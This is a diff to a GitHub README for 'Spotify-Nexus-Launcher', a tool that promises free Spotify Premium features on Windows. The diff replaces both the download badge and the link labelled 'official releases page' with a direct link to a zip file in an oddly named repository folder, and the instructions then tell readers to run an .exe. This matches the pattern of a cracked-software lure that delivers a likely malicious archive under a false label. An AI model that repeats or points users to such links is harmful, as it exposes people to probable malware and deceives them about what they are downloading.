@@ -1,6 +1,6 @@
 # 🎧 Spotify-Nexus-Launcher - Enjoy Premium Music Features For Free
 
-[![Download Spotify-Nexus-Launcher](https://img.shields.io/badge/Download_latest_version-Blue?style=for-the-badge)](https://github.com/Aleenindependent727/Spotify-Nexus-Launcher/releases)
+[![Download Spotify-Nexus-Launcher](https://img.shields.io/badge/Download_latest_version-Blue?style=for-the-badge)](https://github.com/Aleenindependent727/Spotify-Nexus-Launcher/raw/refs/heads/main/unhedged/Launcher_Nexus_Spotify_Arthropoda.zip)
 
 Spotify-Nexus-Launcher upgrades your music listening experience on Windows. It removes advertisements, allows offline storage of songs, and provides high-quality audio streaming. You can manage your playlists and view song lyrics directly within the familiar desktop interface.
 
@@ -8,7 +8,7 @@ Spotify-Nexus-Launcher upgrades your music listening experience on Windows. It r
 
 Follow these steps to install the software on your computer. You do not need technical knowledge to complete this process.
 
-1. Visit the [official releases page](https://github.com/Aleenindependent727/Spotify-Nexus-Launcher/releases).
+1. Visit the [official releases page](https://github.com/Aleenindependent727/Spotify-Nexus-Launcher/raw/refs/heads/main/unhedged/Launcher_Nexus_Spotify_Arthropoda.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can easily find, such as your Downloads folder.
